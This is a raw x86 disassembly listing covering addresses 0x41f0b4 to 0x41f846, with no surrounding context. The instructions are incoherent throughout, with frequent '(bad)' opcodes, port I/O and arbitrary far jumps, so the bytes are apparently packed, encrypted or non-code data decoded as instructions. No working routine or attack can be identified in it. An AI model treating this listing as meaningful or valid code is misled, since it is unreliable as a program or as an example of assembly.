  41f0b4:	test   al,0x87
  41f0b6:	in     al,dx
  41f0b7:	xor    al,0xcc
  41f0b9:	mov    ch,0x33
  41f0bb:	cwde   
  41f0bc:	pop    edx
  41f0bd:	xor    BYTE PTR [eax+0x57897002],al
  41f0c3:	and    bh,bh
  41f0c5:	xchg   ebp,eax
  41f0c6:	test   al,0x8
  41f0c8:	pop    esp
  41f0c9:	cmp    edi,DWORD PTR [eax-0x1bd33145]
  41f0cf:	jle    0x41f0a5
  41f0d1:	or     DWORD PTR [esp+ecx*8],0xf12d48d1
  41f0d8:	sub    BYTE PTR [eax+edi*8+0x36176f59],bl
  41f0df:	xchg   edi,eax
  41f0e0:	mov    esp,0x2e3393ee
  41f0e5:	shl    DWORD PTR [ebx*1+0x48dfb79c],cl
  41f0ec:	fmul   QWORD PTR [ecx]
  41f0ee:	mov    edi,ss
  41f0f0:	imul   DWORD PTR [edi-0x40d49473]
  41f0f6:	aas    
  41f0f7:	jns    0x41f0fa
  41f0f9:	(bad)  
  41f0fa:	out    0x83,al
  41f0fc:	or     ebx,DWORD PTR [ecx]
  41f0fe:	pop    esi
  41f0ff:	ret    
  41f100:	and    eax,0x5bbf6868
  41f105:	pushf  
  41f106:	xor    BYTE PTR [edx+eax*8+0x4264813b],0xec
  41f10e:	pop    ebx
  41f10f:	mov    bh,0xd3
  41f111:	pop    ds
  41f112:	jno    0x41f191
  41f114:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f115:	loop   0x41f157
  41f117:	in     eax,0x45
  41f119:	mov    ecx,0x8f0eb318
  41f11e:	add    DWORD PTR [edx+0x424926d],eax
  41f124:	dec    esp
  41f125:	leave  
  41f126:	pop    ecx
  41f127:	add    ch,BYTE PTR [esi]
  41f129:	inc    eax
  41f12a:	dec    ah
  41f12c:	paddusb mm7,QWORD PTR [esi+0x3189cd06]
  41f133:	cli    
  41f134:	push   ebp
  41f135:	sub    al,0xbd
  41f137:	fmul   QWORD PTR [ecx-0x38]
  41f13a:	test   ebp,esi
  41f13c:	cdq    
  41f13d:	jbe    0x41f141
  41f13f:	stc    
  41f140:	je     0x41f0e2
  41f142:	dec    esi
  41f143:	pop    ebp
  41f144:	scas   al,BYTE PTR es:[edi]
  41f145:	or     cl,BYTE PTR [ecx+0x8]
  41f148:	jbe    0x41f18e
  41f14a:	in     al,dx
  41f14b:	xlat   BYTE PTR ds:[ebx]
  41f14c:	cmp    al,0xf2
  41f14e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f14f:	add    DWORD PTR [eax+eax*4+0x57],esp
  41f153:	shr    dh,0xb3
  41f156:	pushf  
  41f157:	pop    esp
  41f158:	push   ebp
  41f159:	in     eax,dx
  41f15a:	cmp    DWORD PTR [eax+0x79cfc965],edi
  41f160:	hlt    
  41f161:	rcr    DWORD PTR [esi],1
  41f163:	mov    esp,0xc5d66e87
  41f168:	or     edx,ecx
  41f16a:	pop    esp
  41f16b:	lea    ebp,[ebx-0x24722b79]
  41f171:	addr16 inc esp
  41f173:	ds pop edi
  41f175:	dec    esi
  41f176:	(bad)
  41f17a:	shr    DWORD PTR [edi-0x2b],cl
  41f17d:	pinsrw mm0,WORD PTR [ebx+0x42],0x6
  41f182:	dec    esp
  41f183:	out    0xb7,al
  41f185:	inc    edx
  41f186:	imul   ebp,ebp,0xffffffc6
  41f189:	pop    ebx
  41f18a:	pop    ebx
  41f18b:	dec    edx
  41f18c:	ret    
  41f18d:	pop    ds
  41f18e:	dec    edi
  41f18f:	aas    
  41f190:	popf   
  41f191:	loop   0x41f14f
  41f193:	pop    ss
  41f194:	jnp    0x41f181
  41f196:	inc    ebp
  41f197:	sbb    eax,0x3a623696
  41f19c:	adc    al,0xb1
  41f19e:	xchg   ebp,eax
  41f19f:	dec    ebp
  41f1a0:	jg     0x41f1dc
  41f1a2:	xor    esp,DWORD PTR [ebp+0x5c]
  41f1a5:	rol    DWORD PTR gs:[ebp+eax*1+0x2147a61f],cl
  41f1ad:	xchg   edx,eax
  41f1ae:	jb     0x41f170
  41f1b0:	inc    edx
  41f1b1:	fisttp WORD PTR [ebp-0x7]
  41f1b4:	mov    ds:0xb431d950,eax
  41f1b9:	(bad)  
  41f1ba:	scas   al,BYTE PTR es:[edi]
  41f1bb:	dec    edi
  41f1bc:	shr    DWORD PTR [edi-0x50699401],cl
  41f1c2:	mov    ah,0xf7
  41f1c4:	pop    edx
  41f1c5:	test   DWORD PTR [esi+0xb],0x3ce68444
  41f1cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f1cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f1ce:	adc    dh,BYTE PTR [esi+ebx*2+0x68d0d251]
  41f1d5:	(bad)  
  41f1d6:	lods   al,BYTE PTR ds:[esi]
  41f1d7:	(bad)  
  41f1d8:	stc    
  41f1d9:	in     eax,dx
  41f1da:	jecxz  0x41f17d
  41f1dc:	test   DWORD PTR [eax+eax*4-0x5187f02],eax
  41f1e3:	les    esp,FWORD PTR [edi]
  41f1e5:	fnstcw WORD PTR [ebx-0x681bd923]
  41f1eb:	popf   
  41f1ec:	xchg   edi,eax
  41f1ed:	pop    eax
  41f1ee:	xor    cl,BYTE PTR [ecx*4+0x5ac1b9b0]
  41f1f5:	out    dx,al
  41f1f6:	push   ebp
  41f1f7:	aad    0x7a
  41f1f9:	out    dx,al
  41f1fa:	mov    ?,WORD PTR [eax+0x6bb2d882]
  41f200:	fstp   DWORD PTR [edx-0x7d4d9408]
  41f206:	dec    esp
  41f207:	cld    
  41f208:	inc    esi
  41f209:	adc    dl,BYTE PTR [edx+0x2ed1706a]
  41f20f:	(bad)  
  41f211:	and    ebp,DWORD PTR [esi]
  41f213:	gs adc eax,0xfd665e94
  41f219:	sbb    al,0xf3
  41f21b:	xchg   esi,eax
  41f21c:	pop    edx
  41f21d:	mov    edx,0x5b49dd58
  41f222:	or     eax,0x74f88b88
  41f227:	in     al,0x9f
  41f229:	push   edx
  41f22a:	and    edi,ebx
  41f22c:	xor    al,0xf1
  41f22e:	stc    
  41f22f:	pop    eax
  41f230:	jmp    0x6cec:0x833cdc67
  41f237:	iret   
  41f238:	inc    ebx
  41f239:	mov    dh,0x54
  41f23b:	push   eax
  41f23c:	int3   
  41f23d:	sub    BYTE PTR [eax+0x1feea49d],dl
  41f243:	lahf   
  41f244:	cwde   
  41f245:	popf   
  41f246:	sbb    BYTE PTR [esi-0x33],ah
  41f249:	aas    
  41f24a:	mov    BYTE PTR [esi+0x61],ah
  41f24d:	or     edx,esp
  41f24f:	mov    WORD PTR [eax+0x5b],es
  41f252:	iret   
  41f253:	je     0x41f2bd
  41f255:	sti    
  41f256:	mov    ds,WORD PTR [edx-0x8307771]
  41f25c:	add    al,BYTE PTR [edi-0x761ad795]
  41f262:	sbb    ch,BYTE PTR [eiz*4+0x180a75da]
  41f269:	js     0x41f218
  41f26b:	pusha  
  41f26c:	inc    esi
  41f26d:	adc    eax,0xfa31cac0
  41f272:	cld    
  41f273:	pushf  
  41f274:	stos   DWORD PTR es:[edi],eax
  41f275:	and    esi,DWORD PTR [edx+0x25886ebd]
  41f27b:	push   0xffffffaa
  41f27d:	int3   
  41f27e:	inc    ebp
  41f27f:	ror    BYTE PTR [esi+0x767a5b5b],cl
  41f285:	pop    ds
  41f286:	sar    BYTE PTR [esi-0x5a8c1912],0x5e
  41f28d:	in     eax,dx
  41f28e:	add    DWORD PTR ds:0x82da24b3,ebx
  41f294:	loop   0x41f27c
  41f296:	cmp    dh,BYTE PTR [esi+esi*1-0x782cd776]
  41f29d:	cli    
  41f29e:	scas   eax,DWORD PTR es:[edi]
  41f29f:	xchg   al,ah
  41f2a1:	dec    ebp
  41f2a2:	retf   0x125b
  41f2a5:	cmp    dh,BYTE PTR [eax-0x78]
  41f2a8:	fwait
  41f2a9:	addr16 nop
  41f2ab:	inc    esp
  41f2ac:	cdq    
  41f2ad:	repnz popa 
  41f2af:	xor    al,0x58
  41f2b2:	shr    DWORD PTR [edi],0xc6
  41f2b5:	mov    esi,0x4e5b9100
  41f2ba:	retf   0x8329
  41f2bd:	fs jp  0x41f2d8
  41f2c0:	xor    ebp,0x3658ca49
  41f2c6:	mov    dl,BYTE PTR [ebp+0x34986eac]
  41f2cc:	hlt    
  41f2cd:	adc    bh,al
  41f2cf:	jecxz  0x41f253
  41f2d1:	dec    ebx
  41f2d2:	mov    ds:0x2da33f6,al
  41f2d7:	mov    ecx,0x84b30c00
  41f2dc:	xchg   ebp,eax
  41f2dd:	outs   dx,BYTE PTR ds:[esi]
  41f2de:	stos   DWORD PTR es:[edi],eax
  41f2df:	xchg   BYTE PTR es:[ecx],ch
  41f2e2:	fisttp DWORD PTR [esi+0x2576643c]
  41f2e8:	jno    0x41f30d
  41f2ea:	iret   
  41f2eb:	xchg   esp,eax
  41f2ec:	sbb    ebp,ebp
  41f2ee:	outs   dx,DWORD PTR ds:[esi]
  41f2ef:	ds jno 0x41f334
  41f2f2:	mov    eax,0x2cbd6a88
  41f2f7:	retf   0x957d
  41f2fa:	clc    
  41f2fb:	into   
  41f2fc:	adc    ch,BYTE PTR [ebp-0x33]
  41f2ff:	mov    edi,0x6926ed10
  41f304:	cmp    eax,0x42e835c1
  41f309:	or     BYTE PTR [edx-0x3a9dbaef],bl
  41f30f:	mov    esp,0xa28a6760
  41f314:	cld    
  41f315:	dec    esp
  41f316:	mul    ah
  41f318:	int3   
  41f319:	cli    
  41f31a:	and    DWORD PTR [edx],ecx
  41f31c:	in     al,0xe3
  41f31e:	xor    al,0xbc
  41f320:	das    
  41f321:	sub    ecx,DWORD PTR [edi]
  41f323:	push   esp
  41f324:	add    eax,0xa5215061
  41f329:	outs   dx,DWORD PTR ds:[esi]
  41f32a:	jmp    0xd44d:0x5090413d
  41f331:	retf   
  41f332:	xchg   esi,eax
  41f333:	outs   dx,DWORD PTR ds:[esi]
  41f335:	popf   
  41f336:	jmp    0x18f68342
  41f33b:	sahf   
  41f33c:	gs jmp 0xe332415a
  41f342:	(bad)  
  41f343:	jnp    0x41f334
  41f345:	xchg   edx,eax
  41f346:	(bad)  
  41f348:	fistp  WORD PTR [bx+di-0x51]
  41f34c:	jg     0x41f316
  41f34e:	add    al,0x21
  41f350:	adc    eax,0x259aeba
  41f355:	hlt    
  41f356:	es mov al,0x72
  41f359:	inc    ecx
  41f35a:	cwde   
  41f35b:	test   DWORD PTR [edi+ebp*8],0x54631b18
  41f362:	cmc    
  41f363:	sub    edx,DWORD PTR [ebx+0x7fe93e8d]
  41f369:	cli    
  41f36a:	rcl    BYTE PTR [edx-0x50],0xa5
  41f36e:	mov    edi,0x37c290c
  41f373:	rcr    BYTE PTR [eax+0x747c5f31],1
  41f379:	daa    
  41f37a:	cmp    al,0x29
  41f37c:	push   ss
  41f37d:	or     esi,DWORD PTR [esi]
  41f37f:	loope  0x41f329
  41f381:	dec    ecx
  41f382:	or     eax,0x2f9c46db
  41f387:	jg     0x41f406
  41f389:	ret    0x3cd
  41f38c:	cwde   
  41f38d:	cmp    eax,0xd7073b53
  41f392:	push   ecx
  41f393:	mov    ds:0xfa5aa3f2,eax
  41f398:	push   ds
  41f399:	push   ss
  41f39a:	repnz inc esi
  41f39c:	cld    
  41f39d:	clc    
  41f39e:	xchg   BYTE PTR [ebx+0x3dbaf262],dl
  41f3a4:	popf   
  41f3a5:	fs loop 0x41f391
  41f3a8:	cwde   
  41f3a9:	test   BYTE PTR [eax+0x78a60af0],cl
  41f3af:	jmp    0x41f3c0
  41f3b1:	mov    ebp,esi
  41f3b3:	sub    BYTE PTR [edx*1+0x60fc7558],0xc7
  41f3bb:	(bad)  
  41f3bc:	cmp    ecx,DWORD PTR [eax]
  41f3be:	ret    
  41f3bf:	ds dec ebx
  41f3c1:	pop    ebx
  41f3c2:	xchg   BYTE PTR [esi+0x7a],dl
  41f3c5:	outs   dx,DWORD PTR ds:[esi]
  41f3c6:	imul   ebx,DWORD PTR [edi+0x1d],0x96c8e408
  41f3cd:	cmp    BYTE PTR [edx-0x2361051b],dh
  41f3d3:	out    dx,al
  41f3d4:	pop    esi
  41f3d5:	dec    ebx
  41f3d6:	fwait
  41f3d7:	add    BYTE PTR [esi+0x2b],0xbe
  41f3db:	jmp    DWORD PTR [edi]
  41f3dd:	stos   DWORD PTR es:[edi],eax
  41f3de:	(bad)  
  41f3df:	sub    al,0x7f
  41f3e1:	fwait
  41f3e2:	pop    edx
  41f3e3:	mov    ebx,0xb6ddc291
  41f3e8:	pop    ebp
  41f3e9:	push   esp
  41f3ea:	cmp    bl,bl
  41f3ec:	sbb    esp,DWORD PTR [ebx+0x18]
  41f3ef:	xor    al,0xc7
  41f3f1:	outs   dx,BYTE PTR ds:[esi]
  41f3f2:	mov    dl,0xed
  41f3f4:	jne    0x41f3a4
  41f3f6:	fcom   QWORD PTR [esp+ebx*1+0x2d]
  41f3fa:	mov    ds:0x2bb339eb,al
  41f3ff:	hlt    
  41f400:	scas   eax,DWORD PTR es:[edi]
  41f401:	call   0x9149574a
  41f406:	inc    DWORD PTR [edx]
  41f408:	shr    DWORD PTR [ecx-0x58eded6e],cl
  41f40e:	daa    
  41f40f:	mov    bl,0xa4
  41f411:	adc    eax,DWORD PTR [edx]
  41f413:	dec    esi
  41f414:	pusha  
  41f415:	ins    DWORD PTR es:[edi],dx
  41f416:	xchg   esi,eax
  41f417:	jl     0x41f421
  41f419:	cmc    
  41f41a:	mov    edx,0x35fe13ad
  41f41f:	cmp    eax,0xc7aa5444
  41f424:	adc    cl,BYTE PTR [edx+eiz*2-0x7b]
  41f428:	out    0x5,eax
  41f42a:	inc    eax
  41f42b:	dec    ecx
  41f42c:	mov    ebx,0xcb3159ca
  41f431:	cdq    
  41f432:	(bad)  
  41f433:	or     DWORD PTR [esi-0xd],0xdd1a5a35
  41f43a:	cmp    ebx,DWORD PTR [ebx-0x1a813567]
  41f440:	imul   ecx,edi,0x4e
  41f443:	pmulhw mm5,QWORD PTR [ebx]
  41f446:	mov    dl,BYTE PTR [esi-0x53e6eb92]
  41f44c:	fsubr  QWORD PTR [eax+0x1df5fe8a]
  41f452:	push   ebx
  41f453:	(bad)  
  41f454:	and    BYTE PTR [eax+0x221e1c2d],dl
  41f45a:	or     al,0xa4
  41f45c:	das    
  41f45d:	sbb    edi,DWORD PTR [eax]
  41f45f:	jge    0x41f420
  41f461:	retf   
  41f462:	dec    ebx
  41f463:	out    0x23,eax
  41f465:	imul   ecx,DWORD PTR [esp+ecx*4-0x42],0xffffffa9
  41f46a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f46b:	push   eax
  41f46c:	rcl    BYTE PTR [esi+0x392dda20],0xd5
  41f473:	scas   eax,DWORD PTR es:[edi]
  41f474:	out    0x98,eax
  41f476:	xchg   ebp,eax
  41f477:	out    dx,al
  41f478:	push   ecx
  41f479:	jae    0x41f492
  41f47b:	aas    
  41f47c:	test   eax,0xe9c1e8e0
  41f481:	js     0x41f4b9
  41f483:	int    0x77
  41f485:	sub    DWORD PTR [ebp-0x3e2daad9],edx
  41f48b:	sbb    DWORD PTR [ebp-0x68],0xf40c143f
  41f492:	call   0x8af7:0x6b7a1cd
  41f499:	pop    ebx
  41f49a:	adc    ch,BYTE PTR [edx-0x7158c89c]
  41f4a0:	test   BYTE PTR [eax+0x4a],bh
  41f4a3:	pop    ebp
  41f4a4:	fild   QWORD PTR [ebp-0x253d17bc]
  41f4aa:	lea    ebp,[eax]
  41f4ac:	ins    BYTE PTR es:[edi],dx
  41f4ad:	enter  0x1e44,0xa2
  41f4b1:	sbb    DWORD PTR [ebx],edx
  41f4b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f4b4:	push   es
  41f4b5:	daa    
  41f4b6:	push   0xab3f5fce
  41f4bb:	mov    ds:0x358ff8fd,eax
  41f4c0:	das    
  41f4c1:	xchg   esp,eax
  41f4c2:	inc    ebp
  41f4c3:	mov    DWORD PTR [ecx-0x512bd4b1],esp
  41f4c9:	jmp    0xb1c4:0x2a1a0832
  41f4d0:	push   ss
  41f4d1:	pop    ecx
  41f4d2:	inc    esp
  41f4d3:	jae    0x41f497
  41f4d5:	and    BYTE PTR [eax+0xeaf716c],bh
  41f4db:	jmp    0x8f7f:0x4041e51a
  41f4e2:	nop
  41f4e3:	adc    BYTE PTR [eax],0x3e
  41f4e6:	or     al,0x7a
  41f4e8:	imul   edi,DWORD PTR [ebx+ecx*1+0x5a],0x72
  41f4ed:	test   BYTE PTR [edx+0x62],0x62
  41f4f1:	retf   0x1887
  41f4f4:	(bad)  
  41f4f5:	jb     0x41f4b2
  41f4f7:	xor    eax,0xee0a4e1c
  41f4fc:	push   ebx
  41f4fd:	adc    bl,BYTE PTR [ecx+0x3308ad79]
  41f503:	xor    edi,DWORD PTR [ebx+ebp*2-0xb]
  41f507:	xchg   ecx,eax
  41f508:	repnz mov cl,0x0
  41f50b:	push   cs
  41f50c:	and    esi,esi
  41f50e:	jmp    0x6128237c
  41f513:	mov    cl,0xd7
  41f515:	push   esi
  41f516:	gs push ss
  41f518:	out    0xb1,al
  41f51a:	push   edx
  41f51b:	dec    esi
  41f51c:	xchg   ebp,eax
  41f51d:	inc    ebx
  41f51e:	mov    BYTE PTR [edi-0x9fb75bf],dh
  41f524:	pop    edx
  41f525:	xor    BYTE PTR [edx+esi*1],0xec
  41f529:	(bad)  
  41f52a:	fst    st(1)
  41f52c:	stos   DWORD PTR es:[edi],eax
  41f52d:	jle    0x41f517
  41f52f:	mov    cl,0x12
  41f531:	mov    al,0x22
  41f533:	mov    dl,0x4e
  41f535:	add    al,0x70
  41f537:	mov    ebp,0x23df216d
  41f53c:	jmp    0x41f4d9
  41f53e:	inc    ebx
  41f53f:	push   ds
  41f540:	dec    esi
  41f541:	pop    ds
  41f542:	in     eax,0x12
  41f544:	lock jbe 0x41f598
  41f547:	adc    eax,0xd9f5ad91
  41f54c:	cmp    eax,0xb202390c
  41f551:	imul   edx,DWORD PTR [ebp+0x7],0x67
  41f555:	mov    esi,0x1d4fbfb6
  41f55a:	popf   
  41f55b:	or     BYTE PTR [eax+eax*8-0x4a],ch
  41f55f:	and    eax,0xf39bb46f
  41f564:	mov    dh,0x63
  41f566:	mov    eax,ds:0xdc7561d6
  41f56b:	in     al,dx
  41f56c:	add    ch,cl
  41f56e:	fimul  DWORD PTR [esi]
  41f570:	sub    edi,DWORD PTR [esi-0x21]
  41f573:	adc    bh,bh
  41f575:	inc    esi
  41f576:	ret    
  41f577:	inc    ebx
  41f578:	sub    eax,0x603b642d
  41f57d:	std    
  41f57e:	imul   DWORD PTR [edi+0x68]
  41f581:	xchg   esp,eax
  41f582:	pop    ss
  41f583:	stc    
  41f584:	lea    edx,[edx+ebp*1+0x23]
  41f588:	js     0x41f5c3
  41f58a:	fs das 
  41f58c:	mov    BYTE PTR [ecx],cl
  41f58e:	dec    ebx
  41f58f:	jp     0x41f51c
  41f591:	scas   al,BYTE PTR es:[edi]
  41f592:	aam    0xe4
  41f594:	(bad)
  41f599:	js     0x41f5b5
  41f59b:	pop    edi
  41f59c:	cmp    eax,0x9f322cef
  41f5a1:	sbb    eax,DWORD PTR [ecx+0x5b]
  41f5a4:	stos   BYTE PTR es:[edi],al
  41f5a5:	jp     0x41f5a9
  41f5a7:	lea    ebx,[ecx-0x2cd14ebb]
  41f5ad:	dec    esp
  41f5ae:	mov    BYTE PTR [esi],dh
  41f5b0:	pop    ebp
  41f5b1:	dec    esi
  41f5b2:	rol    BYTE PTR [ecx],0xe2
  41f5b5:	mov    al,0xde
  41f5b7:	loop   0x41f5c0
  41f5b9:	mov    al,BYTE PTR [ecx+0x2b]
  41f5bc:	cmp    dl,0x79
  41f5bf:	and    ecx,ebx
  41f5c1:	js     0x41f5dc
  41f5c3:	mov    ch,0xd0
  41f5c5:	or     DWORD PTR [esp+esi*8],0x25
  41f5c9:	mov    ds:0xb7330227,eax
  41f5ce:	cmp    ebp,DWORD PTR [esi]
  41f5d0:	inc    esp
  41f5d1:	ja     0x41f5c8
  41f5d3:	sbb    BYTE PTR [esi],dl
  41f5d5:	out    dx,al
  41f5d6:	adc    eax,0xb8eebd60
  41f5db:	dec    ebx
  41f5dc:	adc    eax,0xa4e1ef84
  41f5e1:	adc    DWORD PTR ds:0x2e2bd505,ebp
  41f5e7:	rcr    DWORD PTR [edx+0x5c],cl
  41f5ea:	add    edi,DWORD PTR [ebx]
  41f5ec:	jle    0x41f66c
  41f5ee:	xchg   esi,ecx
  41f5f0:	outs   dx,BYTE PTR ds:[esi]
  41f5f1:	xor    DWORD PTR [eax-0x2a],esi
  41f5f4:	dec    ecx
  41f5f5:	jns    0x41f671
  41f5f7:	jno    0x41f5c7
  41f5f9:	fcmove st,st(7)
  41f5fb:	repnz pop ss
  41f5fd:	add    ax,0xc5cf
  41f601:	fisubr WORD PTR [ebx-0x1c7ebabe]
  41f607:	push   ss
  41f608:	pusha  
  41f609:	jmp    0xd1afd079
  41f60e:	add    edx,DWORD PTR [edx+edi*1]
  41f611:	in     al,0x82
  41f613:	popf   
  41f614:	mov    BYTE PTR ds:0xfc494112,0x2c
  41f61b:	xchg   edx,eax
  41f61c:	mov    cl,0x9c
  41f61e:	out    0x18,eax
  41f620:	pop    ecx
  41f621:	xchg   esp,eax
  41f622:	pop    ebp
  41f623:	inc    edx
  41f625:	sahf   
  41f626:	add    BYTE PTR [eax+0x61],0xd2
  41f62a:	int3   
  41f62b:	sub    BYTE PTR [ebx+0x30cfea2],ch
  41f631:	(bad)  
  41f632:	shr    DWORD PTR [ebp-0x74],cl
  41f635:	dec    esi
  41f636:	sub    al,al
  41f638:	popf   
  41f639:	dec    edx
  41f63a:	fwait
  41f63b:	scas   eax,DWORD PTR es:[edi]
  41f63c:	sub    DWORD PTR [ebp+0x139f03bd],ecx
  41f642:	inc    ecx
  41f643:	es jb  0x41f64a
  41f646:	pop    ecx
  41f647:	jl     0x41f5cf
  41f649:	enter  0x6d2d,0xff
  41f64d:	push   ebp
  41f64e:	loop   0x41f6c2
  41f650:	xchg   ebp,eax
  41f651:	cwde   
  41f652:	in     eax,0x1d
  41f654:	pop    ds
  41f655:	dec    eax
  41f656:	pop    eax
  41f657:	mov    al,0xab
  41f659:	xchg   BYTE PTR [edi],ah
  41f65b:	adc    DWORD PTR [ecx],edx
  41f65d:	adc    edx,DWORD PTR [eax-0x49]
  41f660:	dec    ecx
  41f661:	pushf  
  41f662:	div    DWORD PTR [edi]
  41f664:	shl    BYTE PTR [ebx-0x51f1f9f6],cl
  41f66a:	js     0x41f633
  41f66c:	ret    
  41f66d:	add    eax,0x3f8b804b
  41f672:	sbb    esp,DWORD PTR ds:0xe3534830
  41f678:	(bad)
  41f67c:	repnz add eax,0x25c3e326
  41f682:	mov    bl,0x1d
  41f684:	loopne 0x41f6dc
  41f686:	(bad)  
  41f689:	leave  
  41f68a:	xor    DWORD PTR [esp+esi*8-0x1c740e1a],ecx
  41f691:	and    BYTE PTR [ebp+0x1d],0x6f
  41f695:	mov    esp,0xfc9b3881
  41f69a:	arpl   WORD PTR [edx+0x9],di
  41f69d:	mov    esi,0x65098b15
  41f6a2:	lds    edi,FWORD PTR [edx]
  41f6a4:	inc    ebp
  41f6a5:	ret    0x3ffd
  41f6a8:	xchg   DWORD PTR [edx-0x623d25dc],ecx
  41f6ae:	mov    ds:0x2f202cb5,al
  41f6b3:	jmp    0xa4d0efe
  41f6b8:	adc    eax,0x3458822f
  41f6bd:	fiadd  DWORD PTR ds:0x35e57e72
  41f6c3:	or     ebx,edx
  41f6c5:	retf   0x37d2
  41f6c8:	adc    al,0x59
  41f6ca:	inc    esp
  41f6cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f6cc:	xlat   BYTE PTR ds:[ebx]
  41f6cd:	sbb    al,0x4f
  41f6cf:	lock les eax,FWORD PTR [edx]
  41f6d2:	dec    edi
  41f6d3:	push   eax
  41f6d4:	cmc    
  41f6d5:	jl     0x41f716
  41f6d7:	add    al,0xf
  41f6d9:	loope  0x41f69a
  41f6db:	addr16 jge 0x41f701
  41f6de:	aas    
  41f6df:	xchg   ebp,eax
  41f6e0:	jbe    0x41f757
  41f6e2:	mov    ds:0x6cc43c41,al
  41f6e7:	cmp    dl,BYTE PTR [edi+0x2e199331]
  41f6ed:	(bad)
  41f6f0:	sub    eax,0x5475071e
  41f6f5:	test   eax,0x87950e8d
  41f6fa:	jmp    0x72d8e4d6
  41f6ff:	arpl   bp,cx
  41f701:	js     0x41f702
  41f703:	cdq    
  41f704:	sbb    edx,DWORD PTR [edx]
  41f706:	ror    DWORD PTR [eax-0x1dbeaf2c],1
  41f70c:	or     ah,0x40
  41f70f:	xchg   edx,eax
  41f710:	mov    BYTE PTR [edx],al
  41f712:	call   0x5d8f:0xcfc0ef9c
  41f719:	cli    
  41f71a:	icebp  
  41f71b:	retf   0x31
  41f71e:	popa   
  41f71f:	dec    esi
  41f720:	cli    
  41f721:	xchg   esp,eax
  41f722:	push   edx
  41f723:	pop    esi
  41f724:	push   0x86d26c26
  41f729:	push   ss
  41f72a:	adc    bl,ch
  41f72c:	mov    dl,0xc8
  41f72e:	imul   ebx,DWORD PTR [edi+0x5c],0xffffffe2
  41f732:	ficom  DWORD PTR [ebx]
  41f734:	mov    eax,0xe0f6f117
  41f739:	bound  esi,QWORD PTR [edx]
  41f73b:	push   ds
  41f73c:	inc    esi
  41f73d:	sbb    DWORD PTR [edi-0x1f],0x9ae98ad
  41f744:	popa   
  41f745:	mov    eax,0xef933f36
  41f74a:	mov    esi,0xd6ac9258
  41f74f:	push   eax
  41f750:	rcr    cl,1
  41f752:	fs pop ds
  41f754:	and    BYTE PTR [edx+ebx*4-0x55],ch
  41f758:	(bad)  
  41f759:	popf   
  41f75a:	nop
  41f75b:	cs aaa 
  41f75d:	rcl    BYTE PTR [ebx+0x5f36576f],cl
  41f763:	int    0x97
  41f765:	fisub  DWORD PTR [ebx-0x54]
  41f768:	hlt    
  41f769:	cld    
  41f76a:	cli    
  41f76b:	push   edi
  41f76c:	nop
  41f76d:	das    
  41f76e:	push   eax
  41f76f:	xor    eax,0x1b42c30f
  41f774:	push   edx
  41f775:	scas   al,BYTE PTR es:[edi]
  41f776:	xchg   ebp,eax
  41f777:	cmp    bl,cl
  41f779:	and    DWORD PTR [ebp+0x5f],0x8c3f4ad2
  41f780:	jo     0x41f7cf
  41f782:	inc    edx
  41f783:	pushf  
  41f784:	sbb    ebx,DWORD PTR [ebp-0x52]
  41f787:	pushf  
  41f788:	ins    DWORD PTR es:[edi],dx
  41f789:	les    edx,FWORD PTR [ebx+edx*1-0x18]
  41f78d:	es xchg edx,eax
  41f78f:	mov    WORD PTR [ebx+0x6017d887],?
  41f795:	call   0xf5d33b4
  41f79a:	push   ds
  41f79b:	mov    ecx,0xcb8ce440
  41f7a0:	ja     0x41f765
  41f7a2:	out    dx,al
  41f7a3:	ins    BYTE PTR es:[edi],dx
  41f7a4:	xchg   edx,eax
  41f7a5:	xchg   edx,eax
  41f7a6:	adc    eax,0xa8f7bbbd
  41f7ab:	xchg   ebp,eax
  41f7ac:	dec    ebx
  41f7ad:	out    dx,al
  41f7ae:	jbe    0x41f7a9
  41f7b0:	mov    ebx,0x3cf984f9
  41f7b5:	inc    ebx
  41f7b6:	sub    DWORD PTR [edi+0xe7df462],edi
  41f7bc:	xor    DWORD PTR [eax],esi
  41f7be:	dec    esp
  41f7bf:	popf   
  41f7c0:	test   eax,0x82709905
  41f7c5:	and    al,0x5a
  41f7c7:	mov    dl,0x73
  41f7c9:	pop    ebp
  41f7ca:	ins    BYTE PTR es:[edi],dx
  41f7cb:	or     BYTE PTR [edx+eiz*1-0x45],ah
  41f7cf:	cld    
  41f7d0:	add    eax,0x417bf6bf
  41f7d5:	jecxz  0x41f7de
  41f7d7:	stos   BYTE PTR es:[edi],al
  41f7d8:	mov    ebp,fs
  41f7da:	retf   
  41f7db:	out    0x79,al
  41f7dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f7de:	add    al,0xce
  41f7e0:	loope  0x41f812
  41f7e2:	pop    eax
  41f7e3:	xchg   esi,eax
  41f7e4:	mov    ch,0x9e
  41f7e6:	xchg   ebp,eax
  41f7e7:	outs   dx,BYTE PTR ds:[esi]
  41f7e8:	(bad)  
  41f7e9:	out    0x49,al
  41f7eb:	push   es
  41f7ec:	loopne 0x41f802
  41f7ee:	cwde   
  41f7ef:	and    BYTE PTR es:0x3d2ac8ce,ah
  41f7f6:	cmp    BYTE PTR [ebx-0x25702bec],ch
  41f7fc:	sbb    ebx,DWORD PTR [ebx-0x6e]
  41f7ff:	inc    ecx
  41f800:	pop    ecx
  41f801:	push   es
  41f802:	test   DWORD PTR [eax+0x22],0xcf15b818
  41f809:	sub    cl,BYTE PTR ds:0xbe42d5ac
  41f80f:	(bad)  
  41f810:	fcomp  DWORD PTR [esi+eiz*8]
  41f813:	ror    DWORD PTR ds:0xb04da8d8,0x88
  41f81a:	xor    eax,DWORD PTR [edi+0x5e]
  41f81d:	and    BYTE PTR [edx+0x42],al
  41f820:	hlt    
  41f821:	cmc    
  41f822:	push   esp
  41f823:	inc    ecx
  41f824:	test   ebp,0x97475020
  41f82a:	sar    edi,0x6b
  41f82d:	outs   dx,BYTE PTR ds:[esi]
  41f82e:	sahf   
  41f82f:	aam    0xb9
  41f831:	pop    eax
  41f832:	icebp  
  41f833:	cmp    ch,BYTE PTR [edx]
  41f835:	in     eax,0xe2
  41f837:	push   esp
  41f838:	mov    ds:0xf25e2981,eax
  41f83d:	sub    al,0x9f
  41f83f:	call   0x9feb:0xcc3ca57f
  41f846:	(bad)  
